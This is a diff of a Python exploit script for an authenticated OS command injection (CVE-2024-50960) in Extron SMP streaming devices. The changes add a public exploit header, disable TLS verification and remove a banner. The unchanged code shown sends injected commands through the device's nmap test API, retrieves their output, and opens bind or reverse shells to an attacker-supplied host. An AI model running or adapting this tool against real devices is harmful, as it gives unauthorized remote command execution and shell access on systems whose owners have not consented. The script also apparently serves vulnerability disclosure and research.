@@ -1,6 +1,12 @@
-# Extron SMP OS Command Injection
-# By Ryan Roth @f1rstm4tter
-# www.layer8security.com
+#!/usr/bin/env python3
+# Exploit Title: Extron SMP - Authenticated OS Command Injection
+# Date: 2025-04-09
+# Exploit Author: Ryan Roth (@f1rstm4tter)
+# Vendor Homepage: https://www.extron.com/
+# Software Link: https://www.extron.com/product/smp352
+# Version: Extron SMP 111 (firmware ≤ 3.01), 351 (firmware ≤ 2.16), 352 (firmware ≤ 2.16)
+# CVE: CVE-2024-50960
+# Advisory: https://ryanmroth.com/articles/exploiting-extron-smp-command-injection
 
 import json
 import time
@@ -9,13 +15,14 @@ import argparse
 import ipaddress
 import logging
 import requests
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # Constants
 API_BASE_URL = "/api/swis/resources"
 NMAP_TEST_URI = "/nmap/test"
 
 # Set up logging with custom levels
-
 
 def setup_logging(verbose=False, log_file=None):
     """Set up logging to console and optionally to a file."""
@@ -39,14 +46,12 @@ def setup_logging(verbose=False, log_file=None):
 
 # Utility Functions
 
-
 def encode_credentials(password):
     """Base64 encode the username and password."""
     if password:
         credentials = f"admin:{password}"
         return base64.b64encode(credentials.encode('utf-8')).decode('utf-8')
     return None
-
 
 def build_request_headers(credentials):
     """Build the HTTP headers for the request."""
@@ -55,12 +60,10 @@ def build_request_headers(credentials):
         headers["Authorization"] = f"Basic {credentials}"
     return headers
 
-
 def construct_url(rhost, rport, endpoint):
     """Construct the URL based on protocol and endpoint."""
     protocol = "https" if rport == "443" else "http"
     return f"{protocol}://{rhost}{endpoint}"
-
 
 def validate_ip(ip):
     """Validate if the provided string is a valid IP address."""
@@ -70,7 +73,6 @@ def validate_ip(ip):
     except ValueError as e:
         raise argparse.ArgumentTypeError(f"Invalid IP address: {ip}") from e
 
-
 def validate_port(port):
     """Validate the port number ensuring it is a string representing a valid port (1-65535)."""
     if not port.isdigit() or not (1 <= int(port) <= 65535):
@@ -79,7 +81,6 @@ def validate_port(port):
     return port
 
 # Core Function to send payloads
-
 
 def send_payload(rhost, rport, payload, credentials=None):
     """Sends a command or shell payload to the target system."""
@@ -98,7 +99,7 @@ def send_payload(rhost, rport, payload, credentials=None):
 
     try:
         response = requests.put(url, headers=headers,
-                                data=json.dumps(data), timeout=10)
+                                data=json.dumps(data), timeout=10, verify=False)
         response.raise_for_status()  # Raise an error for bad responses
         logging.info("Payload sent successfully.")
         return response
@@ -111,7 +112,6 @@ def send_payload(rhost, rport, payload, credentials=None):
     return None
 
 # Command Injection Functions
-
 
 def inject_command(rhost, rport, cmd, credentials=None):
     """Injects an arbitrary command."""
@@ -156,14 +156,13 @@ def inject_command(rhost, rport, cmd, credentials=None):
         "Retrieving results for command: %s with injection ID: %s", cmd, injection_id)
     get_injection_result(rhost, rport, injection_id, credentials)
 
-
 def get_injection_result(rhost, rport, injection_id, credentials=None):
     """Gets the result of an arbitrary command injection."""
     url = construct_url(
         rhost, rport, f"{API_BASE_URL}?&uri=%2Fnmap%2Ftest%3Fid%3D{injection_id}")
     headers = build_request_headers(credentials)
     try:
-        response = requests.get(url, headers=headers, timeout=10)
+        response = requests.get(url, headers=headers, timeout=10, verify=False)
         # response.raise_for_status()  # Raise an error for bad responses
 
         # Log the raw response payload for troubleshooting
@@ -188,7 +187,6 @@ def get_injection_result(rhost, rport, injection_id, credentials=None):
 
 # Shell Spawning Function
 
-
 def spawn_shell(shell_type, rhost, rport, lhost=None, lport=None, credentials=None):
     """Handles the spawning of bind or reverse shells."""
     if shell_type == "bind":
@@ -212,7 +210,6 @@ def spawn_shell(shell_type, rhost, rport, lhost=None, lport=None, credentials=No
     send_payload(rhost, rport, payload, credentials)
 
 # Main Functions
-
 
 def setup_subparsers(parser):
     """Sets up the subparsers for command injection and shell spawning."""
@@ -254,18 +251,6 @@ def setup_subparsers(parser):
 
 def main():
     """Main function to handle CLI arguments and execute appropriate actions."""
-
-    # What would we be without some ascii?
-    banner = r"""
-   ____     __                  ____       _         __ 
-  / __/_ __/ /________  ___    /  _/__    (_)__ ____/ /_
- / _/ \ \ / __/ __/ _ \/ _ \  _/ // _ \  / / -_) __/ __/
-/___//_\_\\__/_/  \___/_//_/ /___/_//_/_/ /\__/\__/\__/ 
-                                     |___/          
-                                                    @f1rstm4tter
-
-    """
-    print(banner)
 
     parser = argparse.ArgumentParser(
         description="A tool to exploit OS command injection vulnerabilities in Extron SMP devices.",
